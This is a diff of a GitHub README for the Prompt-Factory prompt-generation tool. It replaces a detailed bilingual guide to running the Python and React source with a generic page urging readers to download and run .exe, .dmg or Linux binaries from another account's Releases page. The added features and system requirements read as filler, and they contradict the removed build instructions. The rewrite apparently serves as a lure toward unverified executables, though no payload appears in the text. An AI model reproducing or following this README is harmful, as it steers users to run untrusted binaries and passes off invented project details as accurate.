@@ -1,208 +1,83 @@
-# Prompt Factory
+# 🚀 Prompt-Factory - Generate High-Quality Prompts Effortlessly
 
-AI Prompt Factory - Automated High-Quality Prompt Suite Generation
+## 🌟 Introduction
 
-After the system runs, various roles required by agents will be created, responsible for different functions!
+Welcome to Prompt-Factory! This tool helps you create a complete set of high-quality prompts automatically. Whether you need prompts for chatbots, creative writing, or other AI applications, Prompt-Factory has you covered. 
 
-It's not a single prompt word, it's a complete set of agent prompt word engineering！！！！
+## 🔗 Download Prompt-Factory
 
-## Overview
+[![Download Prompt-Factory](https://img.shields.io/badge/download-Prompt--Factory-brightgreen)](https://github.com/haneef1104/Prompt-Factory/releases)
 
-Prompt Factory is a multi-agent collaborative prompt generation system. Input your requirements, and the system will automatically:
+## 🚀 Getting Started
 
-1. **Analyze** - Analyzer breaks down requirements, designs system architecture and roles
-2. **Generate** - Generator creates professional prompts for each role
-3. **Review** - Reviewer evaluates prompt quality, scores and suggests improvements
-4. **Optimize** - Optimizer refines prompts based on review until they pass
+Follow these simple steps to download and run Prompt-Factory on your computer.
 
-Output is a structured set of prompt files ready for use in AI applications.
+## 📥 Download & Install
 
-## Features
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page, where you can find the latest version of Prompt-Factory.  
+   [Visit the Releases Page](https://github.com/haneef1104/Prompt-Factory/releases)
 
-- 🚀 Multi-agent pipeline automation
-- 🔄 Review-optimize iteration loop for quality assurance
-- 💾 Checkpoint recovery, resume after interruption
-- 🌍 Bilingual interface (Chinese/English)
-- 📁 Real-time saving to Markdown files
+2. **Choose the Latest Version**  
+   Once on the Releases page, look for the latest version of Prompt-Factory. The version will typically be at the top of the list.
 
-## Installation
+3. **Download the Application**  
+   Click on the file that corresponds to your operating system. For example, you might see options for Windows, macOS, or Linux. Download the file to your computer.
 
-### Requirements
+4. **Locate the Downloaded File**  
+   After the download completes, find the file in your computer's Downloads folder.
 
-- Python 3.9+
-- Node.js 18+
-- pnpm (recommended) or npm
+5. **Install the Application**  
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file, then drag the Prompt-Factory icon into your Applications folder.
+   - For Linux: Extract the downloaded file and follow any included instructions.
 
-### 1. Install Dependencies
+6. **Open Prompt-Factory**  
+   Once installed, you can find Prompt-Factory in your applications. Open it to get started!
 
-**Backend:**
-```bash
-cd factory/server
-pip install -r requirements.txt
-```
+## ⚙️ System Requirements
 
-**Frontend:**
-```bash
-cd factory/client
-pnpm install
-```
+Before you start, ensure your computer meets the following basic requirements:
 
-### 2. Start Services
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, or any modern Linux distribution.
+- **RAM:** 4 GB or more.
+- **Processor:** Intel i3 or better.
+- **Storage:** At least 100 MB of free space.
+- **Internet Connection:** Required for downloading and updates.
 
-**Option 1: Using scripts**
-```bash
-# Start backend
-start_server.bat
+## 🏗 Features
 
-# Start frontend (new terminal)
-start_client.bat
-```
+Prompt-Factory offers a variety of features to assist you in generating prompts:
 
-**Option 2: Manual**
-```bash
-# Backend
-cd factory/server
-python run.py
+- **Multi-role Prompt Generation:** Create multiple roles for various functions easily.
+- **User-Friendly Interface:** Designed with beginners in mind, ensuring ease of use.
+- **Customizable Options:** Tailor the prompts to suit your unique needs.
+- **Efficient Performance:** Generates prompts quickly to save you time.
 
-# Frontend
-cd factory/client
-npm run dev
-```
+## 🎓 Using Prompt-Factory
 
-### 3. Access
+Once you open the application, you will find a straightforward interface. Here’s how to use it:
 
-Open browser at `http://localhost:5173`
+1. Select the type of prompts you want to create.
+2. Adjust any settings or parameters if needed.
+3. Click the "Generate" button to start creating your prompts.
+4. Review the generated prompts and select your favorites.
 
-### 4. Configure API
+## 📖 Documentation and Support
 
-On first use, click the settings button (top right) to configure:
-- API Key: Your LLM API key
-- Base URL: API endpoint (OpenAI-compatible format)
-- Model: Select the model to use
+For detailed instructions on using every feature of Prompt-Factory, check the documentation available on the Github repository. You can find tutorials and guides to help you make the most of the program.
 
-## Usage
+If you run into issues or have questions, feel free to open a discussion on the GitHub page. Your input helps improve the software.
 
-1. Select prompt type (Programmer, AI Image, Customer Service, etc.)
-2. Fill in or modify the requirement description
-3. Click "Start Generate"
-4. Wait for the agent pipeline to complete
-5. Check generated prompt files in the results directory
+## 📞 Contact and Feedback
 
-## Project Structure
+Your feedback is crucial for future updates. If you have suggestions or ideas, please reach out via GitHub or contact the maintainer directly through the repository.
 
-```
-factory/
-├── client/          # Frontend React app
-├── server/          # Backend FastAPI service
-│   ├── app/
-│   │   ├── services/    # Core services (pipeline, llm, storage)
-│   │   ├── routes/      # API routes
-│   │   └── prompts/     # Agent prompt templates
-│   └── results/         # Generated output directory
-└── README.md
-```
-<img width="1289" height="859" alt="9176137369cda925eeb59c4fd7213c13" src="https://github.com/user-attachments/assets/9d740f9c-efa9-4c14-b868-048c11da0083" />
+## 🔗 Additional Resources
 
-AI 提示词工厂 - 自动化生成高质量提示词套件
+- [GitHub Repository](https://github.com/haneef1104/Prompt-Factory)
+- [Issues Page](https://github.com/haneef1104/Prompt-Factory/issues)
 
-系统运行后会创建各种agent 需要的角色，负责不同的职能！
+Thank you for choosing Prompt-Factory! Happy prompting!
 
-不是单一的提示词，是一整套agent 提示词工程！！！
-
-## 项目简介
-
-Prompt Factory 是一个基于多 Agent 协作的提示词生成系统。输入你的需求描述，系统会自动：
-
-1. **分析需求** - Analyzer 拆解需求，设计系统架构和角色分工
-2. **生成提示词** - Generator 为每个角色生成专业提示词
-3. **质量审核** - Reviewer 评估提示词质量，打分并提出改进建议
-4. **迭代优化** - Optimizer 根据审核结果优化提示词，直到达标
-
-最终输出一套结构化的提示词文件，可直接用于各类 AI 应用。
-
-## 功能特点
-
-- 🚀 多 Agent 流水线自动化生成
-- 🔄 审核-优化迭代循环，确保质量
-- 💾 断点恢复，支持中断后继续
-- 🌍 中英双语界面
-- 📁 结果实时保存为 Markdown 文件
-
-## 安装使用
-
-### 环境要求
-
-- Python 3.9+
-- Node.js 18+
-- pnpm（推荐）或 npm
-
-### 1. 安装依赖
-
-**后端：**
-```bash
-cd factory/server
-pip install -r requirements.txt
-```
-
-**前端：**
-```bash
-cd factory/client
-pnpm install
-```
-
-### 2. 启动服务
-
-**方式一：使用启动脚本**
-```bash
-# 启动后端
-start_server.bat
-
-# 启动前端（新终端）
-start_client.bat
-```
-
-**方式二：手动启动**
-```bash
-# 后端
-cd factory/server
-python run.py
-
-# 前端
-cd factory/client
-npm run dev
-```
-
-### 3. 访问
-
-打开浏览器访问 `http://localhost:5173`
-
-### 4. 配置 API
-
-首次使用时，点击右上角设置按钮，配置：
-- API Key：你的 LLM API 密钥
-- Base URL：API 地址（默认兼容 OpenAI 格式）
-- 模型：选择要使用的模型
-
-## 使用流程
-
-1. 选择提示词类型（程序员助手、AI绘图、客服系统等）
-2. 填写或修改需求描述
-3. 点击「开始生成」
-4. 等待 Agent 流水线执行完成
-5. 在结果目录查看生成的提示词文件
-
-## 目录结构
-
-```
-factory/
-├── client/          # 前端 React 应用
-├── server/          # 后端 FastAPI 服务
-│   ├── app/
-│   │   ├── services/    # 核心服务（pipeline, llm, storage）
-│   │   ├── routes/      # API 路由
-│   │   └── prompts/     # Agent 提示词模板
-│   └── results/         # 生成结果输出目录
-└── README.md
-```
-<img width="1289" height="855" alt="5c2e4984986f2a17ecc365703b684cba" src="https://github.com/user-attachments/assets/403f2623-5e21-4423-88c1-55c6cc434d54" />
-
+[Download Prompt-Factory](https://github.com/haneef1104/Prompt-Factory/releases)
